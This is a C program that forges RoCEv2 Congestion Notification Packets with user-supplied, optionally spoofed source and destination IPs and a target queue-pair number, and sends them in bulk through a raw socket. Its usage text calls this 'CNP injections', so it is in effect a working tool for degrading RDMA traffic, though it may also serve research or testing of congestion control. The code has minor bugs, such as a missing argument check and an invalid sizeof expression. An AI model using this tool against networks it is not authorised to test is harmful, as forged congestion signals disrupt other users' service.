#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <zlib.h>
 
#include <arpa/inet.h>

#define PCKT_LEN 8192
#define ROCEPORT (4791)

#define MLX4_ROCEV2_QP1_SPORT (64499)

#define htonll(x) ((((uint64_t)htonl(x)) << 32) + htonl((x) >> 32))

/* 
	96 bit (12 bytes) pseudo header needed for UDP header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t saddr;
	u_int32_t daddr;
	u_int8_t zeros;
	u_int8_t protocol;
	u_int16_t tot_len;
};

#define BTH_DEF_PKEY	(0xffff)
#define BTH_PSN_MASK	(0x00ffffff)
#define BTH_QPN_MASK	(0x00ffffff)
#define BTH_ACK_MASK	(0x80000000)

struct rxe_bth {
	u_int8_t			opcode;
	u_int8_t			flags;
	u_int16_t			pkey;
	u_int32_t			qpn;
	u_int32_t			apsn;
};

struct rxe_reth {
	__be64			va;
	__be32			rkey;
	__be32			len;
};

struct rxe_immdt {
	__be32			imm;
};



/* Compute a partial ICRC for all the IB transport headers. */
uint32_t rxe_icrc_hdr(unsigned char *packet, uint16_t total_paket_size)
{ 
	struct iphdr *ip4h = NULL;
	struct udphdr *udph;
	struct rxe_bth *bth;
	int crc;
	int length = sizeof(struct udphdr) + sizeof(struct iphdr) + sizeof(rxe_bth)  ;

	uint8_t tmp[length];

	/* This seed is the result of computing a CRC with a seed of
	 * 0xfffffff and 8 bytes of 0xff representing a masked LRH. */

	memcpy(tmp, packet, length);
	ip4h = (struct iphdr *)tmp;
	udph = (struct udphdr *)(ip4h + 1);

	ip4h->ttl = 0xff;
	ip4h->check = htons(0xffff);
	ip4h->tos = 0xff;
	 
	udph->check = htons(0xffff);

	bth = (struct rxe_bth *)(udph + 1);

	/* exclude bth.resv8a */
	bth->qpn |= htonl(~BTH_QPN_MASK);



	crc = (0xdebb20e3);
	crc = crc32(crc^ 0xffffffff, tmp, length); //crc32_le

	/* And finish to compute the CRC on the remainder of the headers and payload */
	crc = crc32(crc, packet + length, total_paket_size - length)^ 0xffffffff;
	//printf("ICRC Checksum: %04x\n",ntohl(~crc) );

	return ~crc;
}

// an example of valid RoCEv2 packet
uint8_t packet_example []= {
0x45, 0x00, 0x00, 0x30, 0x54, 0x00, 0x40, 0x00, 0x40, 0x11, 0xd7, 0x83, 0x81, 0x84, 0x86, 0x15, 0x81, 0x84, 0x86, 0x1b, //IP header
0xc0, 0x00, 0x12, 0xb7, 0x00, 0x1c, 0x00, 0x00,  //udp header 
0x11, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0x11, 0x00, 0xbf, 0x09, 0x53, // BTH 
0x1f, 0x00, 0x03, 0xe0}; // AETH

 
uint16_t ip_checksum(struct iphdr *p_ip_header, size_t len)
{
  register int sum = 0;
  uint16_t *ptr = (unsigned short*)p_ip_header;

  while (len > 1){
    sum += *ptr++;
    len -= 2;
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);

  return ~sum;
}
 
int main(int argc, char** argv){

    printf("Usage: sudo ./cnp <Source IP> <Destination iP> <QP number> <NUM CNP injections>\n");
    if(argc <= 3){
    	return -1;
    }

	uint32_t payloadsize = 16;

	unsigned char buffer[PCKT_LEN];
	memset(buffer, 0, PCKT_LEN);
	struct iphdr *ip = (struct iphdr *) buffer;
	struct udphdr *udp = (struct udphdr *) (ip + 1);
	struct rxe_bth *bth = (struct rxe_bth *) (udp + 1);
	struct rxe_reth *reth = (struct rxe_reth *) ( ((char*)bth) + sizeof(struct rxe_bth) );
	uint32_t *icrc = (uint32_t *) ( ((char*)bth) + sizeof(struct rxe_bth) + payloadsize  );

	uint16_t total_paket_size = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct rxe_bth) + payloadsize + sizeof(*icrc) ;


	// see https://community.mellanox.com/s/article/rocev2-cnp-packet-format-example
	uint8_t opcode = 0x81; // CNP opcode
	uint32_t qpn =  atoi (argv[3]);
	uint32_t psn = 0;


	printf("We send RoCEv2 CNP to QPN=%u \n",qpn);
 
	struct pseudo_header ph;

	ip->ihl      = 5;
	ip->version  = 4;
	ip->tos      = 0xc2; // low delay  //0x3 congestion encountered. 
	ip->tot_len  = htons(total_paket_size);
	ip->id       = htons (21504);	//Id of this packet 
	ip->frag_off = htons(0x4000);
	ip->ttl      = 64; // hops
	ip->protocol = 17; // UDP
	// source IP address, can use spoofed address here
	ip->check = 0; // it will be calculate later
	ip->saddr = inet_addr(argv[1]);
	ip->daddr = inet_addr(argv[2]);
 
	udp->source = htons(MLX4_ROCEV2_QP1_SPORT);
	// destination port number
	udp->dest = htons(ROCEPORT);
	udp->len = htons(total_paket_size - sizeof(struct iphdr));
	udp->check = 0; // fill later or ignored

	//pseudo header for checksum calculation
	ph.saddr = ip->saddr;
	ph.daddr =  ip->daddr;
	ph.zeros = 0;
	ph.protocol = ip->protocol;
	ph.tot_len = udp->len;


	//https://github.com/SoftRoCE/rxe-dev/blob/master/drivers/infiniband/hw/rxe/rxe_hdr.h
	bth->opcode = opcode; //8bit
	bth->flags = 0;  
	bth->pkey = htons(65535); 
	bth->qpn = htonl( (0x40<<24) + qpn);
	bth->apsn = 0; //htonl(BTH_PSN_MASK & psn);
	//bth->apsn |= htonl(BTH_ACK_MASK); 

// see https://community.mellanox.com/s/article/understanding-mlx5-linux-counters-and-status-parameters
/*
DestQP set to QPN for which the RoCEv2 CNP is generated
Opcode set to b’10000001
PSN set to 0
SE set to 0
M set to 0
P_Key set to the same value as in the BTH of the ECN packet marked

FECN BECN

*/

	*icrc = (rxe_icrc_hdr(buffer,total_paket_size - sizeof(*icrc)));

	ip->check = 0;
	ip->check = ip_checksum(ip,sizeof(struct iphdr));
	printf("Packet content:\n");
	for (int i = 0; i < total_paket_size; i++)
	{
		printf("%02X ", buffer[i]);
	} 
	printf("\n");


	int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	printf("Socket status %d\n",raw_sock);

	uint32_t tosend = total_paket_size ;

	struct sockaddr_in dst_addr;
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(ROCEPORT);
	dst_addr.sin_addr.s_addr = ip->daddr;
	uint32_t num = atoi (argv[4]);
	for(uint32_t i =0; i<num; i++){
		int ret = sendto(raw_sock, buffer, total_paket_size, 0, (struct sockaddr *)&dst_addr, sizeof(dst_addr)) ;
		if(ret < 0) printf("faield to send\n");
	//	printf("send status %d\n",ret);
	}

 
  return 0;
}
